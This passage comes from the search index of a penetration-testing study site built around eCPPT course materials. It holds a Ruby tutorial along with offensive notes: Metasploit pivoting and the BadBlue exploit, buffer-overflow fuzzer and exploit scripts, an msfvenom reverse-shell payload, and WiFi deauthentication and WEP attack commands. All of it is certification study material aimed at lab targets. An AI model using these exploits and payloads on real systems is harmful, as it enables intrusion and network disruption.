URL&gt;\n(Empire: Interact) &gt; execute\n\n\n# Pivoting over Metasploit\nMeterpreter &gt; run autoroute -s &lt;IP&gt; -n &lt;Subnet&gt;\nMeterpreter &gt; backgrund\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; set srvversion 4a\nmsf &gt; set srvport 9050\nmsf &gt; execute\nmsf &gt; jobs\n\n$ proxychains nmap -sT -Pn -n --top-ports 50 fileserver.ine.local\n$ proxychains firefox &gt; http://fileserver.ine.local\n\n# Exoloit port 80 on fileserver.ine.local\nmsf &gt; exploit/windows/http/badblue_passthru\nmsf &gt; set PAYLOAD windows/meterpreter/bind_tcp\nmsf &gt; set RHOSTS fileserver.ine.local\nmsf &gt; exploit\nmeterpterer &gt; getsystem\nmeterpreter &gt; cat C:\\flag.txt\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/","title":"Ruby & Metasploit","text":""},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#installation-fundamentals","title":"Installation / Fundamentals","text":"<pre><code># Installation\n$ sudo apt-get install &lt;ruby_version&gt;        # Linux\n$ brew install ruby                          # MacOS\n\n# https://www.ruby-lang.org/en/documentation/ruby-from-other-languages/\n\n-----------------------------------------------------------------------------\n\n$ ruby hello.rb             # Ruby from a File\n$ ruby -e \" puts 'Hello\"    # Ruby from Command Line\n$ irb                       # Interactive Ruby\n\n#!/usr/bin/ruby             # shebang\n\n-----------------------------------------------------------------------------\n\n# Ruby One-Liners\n$ ruby -ep 0 file.txt                            # Display content of file\n$ ruby -ne 'END {print \"Lines:\",$.,\"\\n\"}' file   # Display Number of Lines\n$ ruby -i -pe 'gsub \"foo\",\"FOO\"' file            # Change foo to FOO\n\n\n------------------------------------------------------------------------------\n\n# Librarys\n$ gem list                 # Local Librarys\n$ gem install [Library]    # Install Library\n$ gem install pry          # Install pry library\n\n-------------------------------------------------------------------------------\n</code></pre> <p>Interegers</p> <pre><code>puts 2+2\nputs 3.+3\nputs 4.4+5\n\nputs 4.odd?\nputs 4.even?\nputs 4.next\nputs 4.pred\n\nputs 25.to_s\nputs 65.chr\n</code></pre> <p>Strings</p> <pre><code># Quotes\nputs %[Hello \"World\"]\nputs %Q[Hello \"World\"]\nputs %q[Hello \"World\"]\n\n\n# Info about strings\nst = \"myString\"\nst.empty?\nst.frozen?\nst.clear\nst.lenght\nst.size\nst.start_with? \"my\"\nst.end_with? \"ing\"\n\n\n\n# Heredoc\nst = &lt;&lt;END \nand it Heredoc\nScript and\nawesome\nEND\nputs st\n\n\n\n# String Arithmetics\nst = \"MyString is Perl\"\nst &lt;&lt; \"NotMyString\"\nst * 5\nst[Perl] = \"Ruby\"\nst[0] = \"m\"\nst[0..5] = \"MyAbs\"\nst[0..5] = \"M\"\n\n\nst.sub(\"Perl\",\"Ruby\")\nst.gsub(\"Perl\",\"Ruby\")\nst.sub!(\"Perl\",\"Ruby\")\nst.gsub!(\"Perl\",\"Ruby\")\n\nst.insert(0,\"m\")\nst.insert(-2,\"M\")\nst.insert(st.size,\"World\")\n\n\n\n# Interpolation\nputs \"My name is #{Ruby Code}\"\nputs %[My name is #{Ruby Code}]\n\n\n# Some Useful Method\nst = \"Mystring\"\nst.upcase\nst.downcase\nst.capitalize\nst.reverse\nst.chop\n</code></pre> <p>Arrays</p> <pre><code># Create Array\narr = Array.new(10)\narr = Array.new(10, \"HelloWorld\")\narr = Array.new(10, 0)\n\narr2 = Array[\"Hello\", \"World\"]\narr2 = Array[]\narr2 = []\narr2 &lt;&lt; 1 &lt;&lt; 2 &lt;&lt; 3 &lt;&lt; 4 &lt;&lt; 5\n\n# Array Class/Format\nputs arr.class\nputs arr[0].class\nputs arr[1].class\n\n# Multi Array\narr = [1, [\"Hello\", 137], 2 , 3]\narr = [1, [2, [\"Hello\", 137], 3], 4]\n\n\n# Variables in Arrays - If Var is changed, Arr is changed and vice verca\nvar = \"Mystring\"\narr = [1, var]\n\n\n# Insertion\narr = [1,3,4,5]\narr.insert(1,2)                        # Prints 1 2 3 4 5\narr.insert(1,2,11,22,33)               # Prints 1 2 11 22 33 3 4 5\narr &lt;&lt; 6                               # Append\narr[1..3] = [\"two\", \"three\", \"four\"]\n\n\n# Deletion\narr = [1,\"Hello\",3,4,5]\narr.delete_at(0)               # Delete index 0\narr.delete(\"Hello\")            # Delete \"Hello\"\narr.delete(1)                  # Detele 1\n\n\n# Operations between arrays\narr1 = [1,2,3]\narr2 = [2,3,4]\narr3 = [5,6,7]\nall = arr1 + arr2 + arr3\nall = arr1 | arr2                    # No Dublicates\nall = arr1 &amp; arr2                    # Common Elements\nall = arr1 - arr2                    # Difference\n\n\n\n# Stack\narr = [1,\"Hello\",2,3,4]\narr.push(5)\narr.pop\n\n\n# Useful Methods\narr.sort\narr.reverse\narr.uniq\narr.sort!                         # Change Original Object\narr.reverse!                      # Change Original Object\narr.uniq!                         # Change Original Object\n\n\n# Arrays and Strings\narr = [\"Hello\", \"World\", \"!\"]\narr.join(\" \")                     # Prints Hello World !\n\nst = \"Hello World !\"\nst.split(\" \")                     # Prints [\"Hello\", \"World\", \"!\"]\n</code></pre> <p>Ranges and Hash <pre><code># Ranges\n(2..9).to_a                   # Array from 2 to 9\n(2...9).to_a                  # Array from 2 to 8\n(\"a\"..\"z\").to_a               # Array from a to z\n\narr = (\"a\"..\"z\").to_a         # Arr Variable with array from a to z\narr = (\"Hi a\"..\"Hi b\").to_a   # Arr Variable with array from Hi a to Hi z\n\n(2..9).begin\n(2..9).min\n(2..9).max\n(2..9).end\n(2..9).include?(4)\n(2..9) === 4\n(\"a\"..\"z\").include?(\"c\")\n\n\n\n# Hashes / Dictionaries\nhash = {}\nhash[\"a\"] = \"Hello\"\nhash[\"b\"] = \"World\"\n\nhash = {\"a\" =&gt; \"Hello\", \"b\" =&gt; \"World\"}\nhash = {fname:\"Hello\", lname:\"World\"}\nhash = {\":fname\" =&gt; \"Hello\", \":lname\" =&gt; \"World\"}\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#control-structures","title":"Control Structures","text":"<p>Comparison</p> <pre><code>a &lt;=&gt; b\n    0 if a == b\n    1 if a &gt; b\n    -1 if a &lt; b\n</code></pre> <p>Conditionals</p> <pre><code>if x &gt; 0 then\n    puts \"Done\"\nelsif x &lt; 10 then\n    puts \"Undone\"\nelse\n    puts \"Other\"\nend\n\n\nif x &gt; 0 \n    puts \"Done\"\nend\n\n\n\n# Single line Conditions\n\nif x &gt; 0 then puts \"Done\" end\n\nputs \"\\n Done\" if a.is_a? Integer\nputs \"\\n Done\" if a &gt; 0\n\n\n# Case\n\nx = 5\ncase x\n    when 1 then print \"one\"\n    when 2 then print \"two\"\n    when 3 then print \"three\"\n    else print \" idk\"\nend\n\n\n\n# Ternary Operator\n\ntest_expr ? True_expr : false_expr\n\nname == \"Someone\" ? \"Hi Someone\" : \"Who are you ?\"\n</code></pre> <p>Loops </p> <pre><code># While\ni = 0\nwhile i &lt; 5 do                    # With/Without \"do\"\n    puts i\n    i += 1\nend\n\n\nwhile i &lt; 5 do puts i+=1 end\nputs i+=1 while i&lt;5\narr.pop while !arr.empty?\n\n\n# Until\ni = 5\nuntil i == 0 do                   # With/Without \"do\"\n    puts i\n    i -= 1\nend\n\n\nuntil i == 0 do puts i-=1 end\nputs i-=1 until i ==0\n\n\n\n# For\nfor i in [2,5,10] do\n    puts i\nend\n\n\nfor i in 1..10 do\n    puts i\nend\n\n\n# Times\n\nn = 5\nn.times\n    puts \"Hello World !\"\nend\n</code></pre> <p>Iterators &amp; Enumerators</p> <pre><code># Iterators\n\narr.each do |i|\n    puts i\nend\n\n\narr.each { |i| puts i }\n\n(1..10).each { |i| puts i }\n(\"a\"..\"z\").each { |c| puts c }\n\n\n4.upto(20) { |n| puts n }\n5.downto(-2) { |n| puts n }\n\n\n\n# Enumerable Objects\n\narr = [1,2,5,8,11]\n\narr.map! do |i|                               # Change Elements of arr\n    i*i\nend\n\n\nnums = arr.select do |i|                      # Prints 2,8\n    i%2 == 0 \nend\n\n\nnums = arr.reject do |i|                      # Prints 1,5,8,11\n    i%2 == 0\nend\n\n\nnums = arr.inject { |sum, x| sum+x }          # Sums array elements\n\n\n\n# External Enumerators\n\narr = [1,2,5,8,11]\n\nenum = arr.to_enum\nenum.next                          # Prints 2\nenum.next                          # Prints 5\n</code></pre> <p>Altering Structured Control Flow</p> <pre><code># Break\n\nfor i in (1..10)\n    print i, \"\\s\"\n    break if i==5\nend\n\n\n(1..10).each do |i|\n    puts i \n    break if i == 5\nend\n\n\n# Next\n\nfor i in (1..10)\n    next if i == 5\n    print i, \"\\s\"\nend\n\n\n(1..10).each do |i|\n    next if i == 5\n    puts i, \"\\s\"\nend\n</code></pre> <p>BEGIN / END</p> <pre><code>BEGIN {\n puts \"\\n\",\"Beginning code\",\"\\n\"\n}\n\nEND{\n puts \"Ending code\",\"\\n\"\n}\n\nputs \"Normal control flow\",\"\\n\"\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#methods-variables-and-scope","title":"Methods, Variables, and Scope","text":"<p>Methods <pre><code># Methods\n\ndef test(x)\n    return x*2\nend\n\n\n# Alias\n\ndef my_long_name(X)\n    return x\nend\n\nalias f my_long_name\n\n\n\n# Parameter Default Values\n\ndef test(name = \"Someone\")\n    return x\nend\n\n\n# Array as Parameter\n\ndef test(x , *arr)\n    return x\n    return arr\nend\n\n\n# Hashes as Argument\n\ndef test(hash)\n    return hash[:name]\nend\n\ntest({:name=&gt;\"Someone\"})\n</code></pre></p> <p>Variables</p> <pre><code>puts\n# prints the name of the script\nputs \"Script name:\\t\\t#{$0}\"\n\n# prints the command line arguments\nputs \"arguments:\\t\\t#{$*}\"\n\n# reads a line and prints it\nprint \"Write something:\\t\"\n$stdin.gets\nprint \"gets:\\t\\t\\t\",$_\nputs\n\n\n# Constant A-Z\n\nA = 100\nA = 200                               # Error Arised\n\nA = 100\nmodule B\n    A = 200\nend\n\nputs A\nputs B::A\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#classes-modules-and-exceptions","title":"Classes, Modules, and Exceptions","text":""},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#classes-principles","title":"Classes Principles","text":"<p>Clasess</p> <pre><code>class MyClass\n    def func\n        return True\n    end\n\nend\n\nmyobj = MyClass.new\nmyobj.func\n</code></pre> <p>Instance Variables</p> <pre><code>class MyClass\n    @a = 1000\n    def func\n        return @a\n    end\n\nend\n\nmyobj = MyClass.new\nmyobj.func                        # Prints nothing, @a is Myclass Instance\n\n\nclass MyClass\n    def func1\n        @a = 1000\n    end\n    def func2\n        puts @a                 \n    end\nend\n\nmyobj = MyClass.new\nmyobj.func2                      # Prints 1000, Because @a is in same instance\n</code></pre> <p>Getter/Setter <pre><code># Get/Set\n\nclass MyClass\n    attr_accessor :x,:y\n\nend\n\nmyobj = MyClass.new\nmyobj.x = 100\nmyobj.y = 200\nputs myobj.x, myobj.y\n\n\n\n# Get\n\nclass MyClass\n    attr_reader :x,:y\n\nend\n\nmyobj = MyClass.new(100,200)\nputs myobj.x, myobj.y\n</code></pre></p> <p>Class Methods <pre><code>class MyClass\n    def self.func\n        puts \"Hello World !\"\n    end\nend\n\n\nputs Myclass.func\n</code></pre></p> <p>initialize methods <pre><code>class MyClass\n    attr_accessor :x,:y\n\n    def initialize(x,y)\n        @x = x\n        @y = y\n    end\n\n    def sum\n        puts @x + @y\n    end\n\nend\n\nobj = MyClass.new(10,20)\nobj.sum\n</code></pre></p> <p>Open Classes <pre><code>class String\n    def dsize\n        self.size *2\n    end\nend\n\nputs \"Hello\".dsize\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#method-visibility","title":"Method Visibility","text":"<p>Private Methods <pre><code>class MyClass\n    def func\n        return func\n    end\n\n    private\n\n    def privatefunc\n        puts \"Private Func\"\n    end\nend\n</code></pre></p> <pre><code>class MyClass\n    def func\n        return func\n    end\n\n    def privatefunc\n        puts \"Private Func\"\n    end\n\n    private:privatefunc\n\nend\n</code></pre> <pre><code>class MyClass\n    def self.func\n        return func\n    end\n\n    def self.privatefunc\n        puts \"Private Func\"\n    end\n\n    private_class_method:privatefunc\n\nend\n</code></pre> <p>Protected Methods</p> <pre><code># Protected Methods work as private but protected method may be called by any instances of the defining class or its subclasses\n\nclass MyClass\n    def func\n        return func\n    end\n\n    protected       \n\n    def privatefunc\n        puts \"Private Func\"\n    end\nend\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#subclassing-inheritance","title":"Subclassing &amp; Inheritance","text":"<pre><code>class MyClass\n    attr_accessor :name\n\n    def initialize(name)\n        @name = name\n    end\n\n    def to_s\n        \"i am #{name}\"\n    end\nend\n\n\nclass RootClass &lt; MyClass\nobj = RootClass.new(\"Someone\")\nobj.to_s\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#modules","title":"Modules","text":"<p>Modules</p> <pre><code>module MyMath\n    PI = 3.14\n    E = 2.72\n\n    def self.calc(x)\n        return E**x\n    end\n\n    def self.calc2(x)\n        return PI**x\n    end\n\n\nend\n\nputs MyMath.calc(5)\nputs MyMath.calc2(5)\n</code></pre> <p>Mixin</p> <pre><code>module B\n    def hello\n        return \"Hello\"\n    end\nend\n\nclass A\n    include B\n    def world\n        return \"World\"\n    end\nend\n\nobj = A.new\nputs obj.hello, \" \", obj.world\n</code></pre> <pre><code>include Math\nputs PI\nputs E\nputs sqrt(25)\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#exception","title":"Exception","text":"<pre><code>def my_method(a,b,c)\n    # normal flow\nrescue\n    # exception handling\nelse\n    # no exception occur\nensure\n    # alwys executed\n</code></pre> <pre><code>begin\n    # normal flow\nrescue\n    # exception handling\nelse\n    # no exception occur\nensure\n    # alwys executed\n</code></pre> <p>Exception <pre><code>begin\n    print 1/0\nrescue\n    print(\"Error Occourd\")\nend\n</code></pre></p> <p>Retry <pre><code>begin\n    print 1/0\nrescue\n    print(\"Error Occourd\")\n    retry\nend\n</code></pre></p> <p>Ensure <pre><code>begin\n    print 1/0\nrescue\n    print(\"Error Occourd\")\nensure\n    puts(\"Alwys Executed\")\nend\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#pentesters-prerequisites","title":"Pentesters Prerequisites","text":""},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#regex","title":"Regex","text":"<pre><code>st = \"Mystring is a stringA\"\nst =~ /Mystring/              # Regex Match\nst =~ %r(Mystring)            # Regex Match\nst =~ /Mystring/i             # Case Insensitive Match\n\n\n/Mystring/.match(st)          # Regex Match\n/mystring/i.matchst)         # Regex Match\n\nmatching = /Mystring/.match(st)           # Regex Match\nmatching = /Mystring/i.match(st)          # Regex Match\nmatching[0]\n\nst\" =~ /\\(/              # Regex Match find (\nst\" =~ /\\)/              # Regex Match find )\nst =~ /\\|/               # Regex Match find |\n\n\nst =~ /[0-9]/            # digit\nst =~ /[\\d]/             # digit\nst =~ /[\\D]/             # no digit\nst =~ /[\\w]/             # word\nst =~ /[\\W]/             # no word\nst =~ /[\\s]/             # space\nst =~ /[\\S]/             # no space\n\n\n\"Code: 4B\" =~ /\\d[A-Z]/               # prints 6, match 4B\n\nst =~ /strex|string/i                 # Alternatives\nst =~ /strin(g|n)/                    # alternatives\n\nst =~ /string{2}/                     # Occurance twice\nst =~ /^Mystring/                     # Start with \"Mystring\"\nst =~ /string$/                       # end with \"string\"\n\n\nip = /\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}/.match(\"This is my ip 192.168.10.1\")  # Regex IP\nip[0]                                                                       # get IP\n</code></pre> <p>Global Variables <pre><code>string = \"This is my ip 192.168.10.1\"\nstring =~ /\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}/\n$~                                          # matchdata object\n$&amp;                                          # prints searched string (192.168.10.1)\n$1                                          # prints word after space\n$2                                          # so on...\n$~.to_s                                     # to string\n</code></pre></p> <p>Working with Strings <pre><code>text = \"abcd 192.168.10.1 this is my ip 192.168.20.110\"\npattern = /\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}/\n\ntext.scan(pattern) { |x| puts x}                 # prints all ip\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#time","title":"Time","text":"<p>Time <pre><code>Time.now                    # Current time\nTime.now.utc                # Currnet time in UTC\n\nt = Time.local(2014,1,13,11,50)         # Set new time\nt.year\nt.month\nt.day\n</code></pre></p>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#files-and-directories","title":"Files and Directories","text":"<p>Directories <pre><code>Dir.pwd                  # Current directory\nDir.getwd                # Current directory\nDir.home(\"user\")         # Home directory of user\n\n# Change Directory\nDir.chdir(\"/tmp\")\nDir.chdir(\"..\")\n\nDir.chdir(\"/tmp\") do\n    puts Dir.pwd\n    Code Here\nend\n\n\n# Create/Delete Directory\nDir.mkdir(\"test\")                  # Create\nDir.unlink(\"test\")                 # Delete\n\n\n# Directory Listing\nDir.entries(\".\")\nDir[\"*.rb]\n\nDir.foreach(\".\") do |file|\n    puts file\nend\n\n\n# Existence\nDir.exist? \"/tmp\"\n</code></pre></p> <p>Real World - Check if Application Exist <pre><code>#!/usr/bin/ruby\n\ndirectories = [\n'C:\\\\Program FIles\\\\',\n'C:\\\\Program FIles (x86)\\\\',\n'C:\\\\'\n]\n\ninstalled = false\n\nfor dir in directories do\n  dir = dir + ARGV[0]\n  if Dir.exist? dir\n    installed = true\n    puts %Q! Exist : #{dir}!\n    puts \"\\nListing\"\n    Dir.foreach(\".\") { |x| puts x }\n  end\nend\n</code></pre></p> <p>Files</p> <pre><code>File.exist? \"example.txt\"            # Existence\nFile.size? \"example.txt\"             # Size\nFile.file? \"example.txt\"             # Check file\nFile.directory? \"exampledir\"         # Check Directory\nFile.ftype \"example.txt\"            # Prints file type\n\nFile.readable? \"exmaple.txt\"         # Check readable permission\nFile.writable? \"example.txt\"         # Check writable permission\nFile.executable? \"example.txt\"       # Check executable permission\n\nFile.mtime \"example.txt\"             # Check last modification time\nFile.atime \"example.txt\"             # Check last access time\nFile.ctime \"example.txt\"             # Creation time\n\nst = File.stat \"example.txt\"\nst.size\nst.mtime\nst.ctime\n</code></pre> <p>Names</p> <pre><code>path = \"/home/user/flag.txt\"\n\nFile.basename path                    # return flag.txt\nFile.basename(path, \".txt\")           # return flag\n\nFile.dirname path                     # return /home/user\nFile.extname path                 # return .txt\nFile.split path                       # return [\"/home/user/\",\"flag.txt\"]\nFile.expand_path(\"~Desktop\")          # return /home/user/Desktop\n</code></pre> <p>Creation/Deletion/Renaming</p> <pre><code>File.open(\"newfile.txt\",\"w\")          # Create file\nFile.new(\"newfile.txt\",\"w\")           # Create file\n\nFile.rename(\"file.txt\",\"renamedfile.txt\")          # rename file\n\nFile.delete(\"file.txt\")          # Delete file\nFile.unlink(\"file.txt\")          # Delete file\n\nFile.chmod(0777, \"file.txt\")          # Change permission file\n</code></pre>"},{"location":"eCPPT%20Materials/Ruby%20%26%20Metasploit/#input-output","title":"Input Output","text":"<p>File Stream</p> <p>Read file <pre><code># Open and Read file\nFile.open(\"example.txt\" ,\"r\") do | file|\n    contents = file.read\n    puts contents\nend\n\n\n\n# Read Without Open\ncontent = File.read(\"example.txt\") \nputs content\n\n\n# As Array\ncontent = File.readlines(\"example.txt\") \nputs content[0]\n</code></pre></p> <p>Write File <pre><code># Create/Write File\nFile.open(\"example.txt\", \"w\") do |line|\n    line.puts(\"hacked\")\nend\n\n\nFile.open(\"example.txt\", \"w\") do |line|\n    line.write(\"hacked\")\nend\n\n\n# Append/Write file\nFile.open(\"example.txt\", \"a\") do |line|\n    line.puts(\"hacked\")\nend\n\n\nFile.open(\"example.txt\", \"a\") do |line|\n    line.write(\"hacked\")\nend\n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/","title":"System Security","text":""},{"location":"eCPPT%20Materials/System%20Security/#pattern-createoffset","title":"Pattern Create/Offset","text":"<p>Pattern Create/Offset github</p> <p>Usage:</p> <p><pre><code>$ ./pattern create 2048\n</code></pre> <pre><code>$ ./pattern offset 0x67433966\n</code></pre></p> <p>Metasploit <pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb\n</code></pre></p> <p>Mona Plugin</p> <p>Usage : <pre><code>!mona pc 2048\n</code></pre> <pre><code>!mona po 0x67433966\n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/#mona-commands","title":"Mona Commands","text":"<p>Installation : Copy <code>mona.py</code> file into PyCommand folder inside Imunity Debugger installation folder.</p> <p>Then set working folder for Mona : <pre><code>!mona config -set workingfolder C:\\ImmunityLogs\\%p\n</code></pre></p> <p>Once application crashes and EIP is overwriten, run following command to provide Metasploit Module for exploiting the application :</p> <pre><code>!mona suggest\n</code></pre> <p>List of avalable modules used by application : <pre><code>!mona modules\n</code></pre></p> <p>List of modules, which have not ASLR enabled : <pre><code>!mona noaslr\n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/#finding-bad-characters","title":"Finding Bad Characters","text":"<pre><code>#!/usr/bin/env python\nfrom __future__ import print_function\n\nfor x in range(1, 256):\n    print(\"\\\\x\" + \"{:02x}\".format(x), end='')\n\nprint()\n</code></pre> <p>Generate bytearray.bin <pre><code>!mona bytearray -b \"\\x00\"\n</code></pre></p> <p>Compare <pre><code>!mona compare -f C:\\mona\\oscp\\bytearray.bin -a &lt;ESP_address&gt;\n</code></pre></p> <p>[!NOTE] Remember that badchars can affect the next byte as well!</p>"},{"location":"eCPPT%20Materials/System%20Security/#call-esp-jmp-esp","title":"CALL ESP / JMP ESP","text":"<p>findjmp2 </p> <p>usage : <pre><code>.\\findjmp.exe kernel32.exe esp\n</code></pre></p> <p>Mona Plugin Documentation</p> <p>Usage : <pre><code>!mona jmp -r esp -m kernel\n</code></pre> <pre><code>!mona jmp -r esp -m kernel32.dll\n</code></pre> <pre><code>!mona jmp -r esp -cpb \"\\x00\"\n</code></pre></p> <p>[!Note]  In order to correctly write this address, we will have to write it in little-endian.</p>"},{"location":"eCPPT%20Materials/System%20Security/#msfvenom","title":"MSFVenom","text":"<p>Payload : <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=4444 -f c  -b \"\\x00\\x0A\\x0D\" \n</code></pre></p>"},{"location":"eCPPT%20Materials/System%20Security/#exploits","title":"Exploits","text":"<p>Fuzzer <pre><code>#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = \"10.10.33.182\"\n\nport = 1337\ntimeout = 5\nprefix = \"OVERFLOW1 \"\n\nstring = prefix + \"A\" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      s.recv(1024)\n      print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n      s.send(bytes(string, \"latin-1\"))\n      s.recv(1024)\n  except:\n    print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * \"A\"\n  time.sleep(1)\n</code></pre></p> <p>Exploit <pre><code>#!/usr/bin/env python3\nimport socket\n\nip = \"10.10.33.182\"\nport = 1337\n\nprefix = \"OVERFLOW1 \"\noffset = 0\noverflow = \"A\" * offset\nretn = \"\"\npadding = \"\"\npayload = \"\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/","title":"WIFI Security","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#environment-setup","title":"Environment Setup","text":"<pre><code># Check if system is using mac80211 drivers\n$ lsmod | grep mac80211\n\n\n# Details about wireless device\n$ iwconfig\n$ iw list\n\n\n# Change WiFi channel\n$ iwconfig wlan0 channel 11\n$ iw dev wlan0 set channel 11\n\n\n# Increase Maximum Transit Power of a Wireless Adapter\n$ iw reg set BO                               # Set to Bolivia\n$ iw dev wlan0 set txpower fixed 30dbm        # Set power to 30dbm\n$ iwconfig wlan0                              # Check\n\n\n\n# Set-Up Monitor Mode Interface on wlan0\n$ airmon-ng start wlan0\n$ airmon-ng stop wlan0\n$ iwconfig mon0                             \n\n\n# Kill programs which block wireless interface and forbid changing parameters\n$ airmon-ng check kill\n\n\n\n# Check if everything is working fine\n$ aireplay-ng -9 mon0\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#wireless-standards-and-networks","title":"Wireless Standards and Networks","text":"<pre><code># IEEE 802.11 starnarts\n    802.11 (Legacy)     -    2.4 GHz\n    802.11a             -    5 GHz \n    802.11b             -    2.4 GHz \n    802.11g             -    2.4 GHz \n    802.11n             -    2.4/5 GHz \n\n\n# Type of Wireless Networks\n    Infrastructure Network\n    Ad-Hoc Network\n\n\n# Authentication Modes\n    Open Authentication\n    Shared Key Authentication (SKA)\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#discover-wi-fi-networks","title":"Discover Wi-Fi Networks","text":"<p>Tools <pre><code># InSSIDer - Windows\n# https://www.metageek.com/\n\n\n-------------------------------------------------------------------------------\n\n\n# Kismet - Linux\n# https://www.kismetwireless.net/\n\n$ kismet -c &lt;mon_interface&gt;                          # Start sniffing\n\n\n-------------------------------------------------------------------------------\n\n# Airodump-ng  - Linux\n\n$ airodump-ng &lt;mon_interface&gt;\n$ airodump-ng -c 1,6,11 &lt;mon_interface&gt;           # Listen only 1,6,11 Channels\n$ airodump-ng -w &lt;filename&gt; &lt;mon_interface&gt;       # Capture to .cap file\n$ airodump-ng  -c &lt;chanell&gt; --bssid &lt;BSSID&gt; &lt;mon_interface&gt;\n$ airodump-ng -t wep &lt;mon_interface&gt;              # Capture only WEP network\n</code></pre></p> <p>Hidden Networks <pre><code># Wireshark - Beacom Frames\nwlan[0]== 0x80\n\n# Wireshark - Probe Responses\nwlan.fc.type_subtype == 0x05\n\n-------------------------------------------------------------------------------\n\n$ kismet -c &lt;mon_interface&gt;                    # Capture Networks\n\n# Send Deauth packets to get Hidden network SSID through Probe Responses\n$ aireplay-ng -0 &lt;num&gt; -c &lt;client_mac&gt; -a &lt;BSSID&gt; &lt;mon_interface&gt;\n\n# Check on kismet Hidden network SSID or filter Wireshark as follow\nwlan.fc.type_subtype == 0x05\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#traffic-analysisdecrypt","title":"Traffic Analysis/Decrypt","text":"<pre><code># Capture Frames to .cap file\n$ airodump-ng -w &lt;outputfile&gt; &lt;mon_interface&gt;\n\nwlan.fc.type_subtype != 0x08               # Filter Frames except Beacon frames\nwlan.bssid == &lt;BSSID&gt;                      # Filter by AP MAC address\nwlan.fc.type_subtype == 0x02               # Get Data Frames\nwlan.fc.type_subtype == 8                  # Get Network SSID\n\n\n-------------------------------------------------------------------------------\n\n\n\n# Traffic Decryption - Wireshark\n&gt; Edit &gt; Preferences &gt; Protocols &gt; IEEE 802.11 &gt; Edit Decryption Keys\n&gt; WEP - Hexademical Key\n&gt; WPA - Key:SSID\n\n\n# Traffic Decryption - Airdecap-ng \n$ airdecap-mg -w &lt;wep_key_in_hex&gt; &lt;.cap&gt;                   # Decrypt WEP\n$ airdecap-mg -p &lt;wpa_passphrase&gt; -e &lt;SSID&gt; &lt;.cap&gt;         # Decrypt WPA\n\n\n# Maintian IEEE 802.11 flags after decryption\n$ airdecap-mg -w &lt;wep_key_in_hex&gt; &lt;.cap&gt; -1                 # Decrypt WEP\n\n\n\nNOTE: Only traffic that was captured after the handshake can be decrypted\n\nNOTE: Take attention to get 4 way handshake\n\n\n\n\n\n-------------------------------------------------------------------------------\n\n# Setup\n1. airmon-ng check kill\n2. airmon-ng start wlan0\n3. airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt;\n4. aireplay-ng -0 &lt;num&gt;  -c &lt;client_mac&gt; -a &lt;BSSID&gt; wlan0mon\n5. airdecap-mg -p &lt;wpa_passphrase&gt; -e &lt;SSID&gt; &lt;filename.cap&gt;\n6. Open in Wireshark\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#attacking-wi-fi-networks","title":"Attacking Wi-Fi Networks","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wep","title":"WEP","text":"<p>Increment the packet rate of  <code>#Data</code> and <code>#/s</code>/s Columns on Airodump-ng <pre><code>$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt;   # Listen\n\n\n1. Deauthentication Attack\n2. ARP Replay Attack\n</code></pre></p> <p>ARP Replay - Fake Authentication -  Increment the packet rate <pre><code>$ aireplay-ng -1 &lt;delay_between_authentication&gt; -a &lt;bssid&gt; -e &lt;essid&gt; &lt;intf&gt;\n$ aireplay-ng -1 15 -a &lt;bssid&gt; -e &lt;essid&gt; &lt;intf&gt;\n</code></pre></p> <p>ARP Replay - Troubleshooting/Picky AP - Increment the packet rate <pre><code>$ aireplay-ng -1 6000 -q 10 -o 1 -a &lt;bssid&gt; -e &lt;essid&gt; &lt;intf&gt;\n    -q = Keep-Alive Packets\n    -o = Send one set of packets at atime\n</code></pre></p> <p>Listen for ARP requests send by clients to the network <pre><code>$ 